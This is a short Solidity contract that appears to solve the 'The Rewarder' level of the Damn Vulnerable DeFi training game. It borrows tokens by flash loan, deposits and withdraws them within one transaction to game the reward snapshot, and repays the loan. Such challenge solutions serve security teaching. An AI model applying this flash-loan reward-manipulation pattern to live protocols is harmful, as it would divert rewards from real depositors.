// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";

contract check
{
    DamnValuableToken public a;
    FlashLoanerPool public b;
    TheRewarderPool public c;

    function setup(TheRewarderPool x, FlashLoanerPool y) public 
    {
        a = DamnValuableToken(x.liquidityToken());
        b = y;
        c = x; 

        a.approve(address(c), type(uint256).max );
        
    }

    function start(uint amount) public 
    {
        b.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public 
    {
        c.deposit(amount);
        c.withdraw(amount);
        a.transfer(address(b), amount);
    }
    
    fallback() external payable 
    {
        
    }
}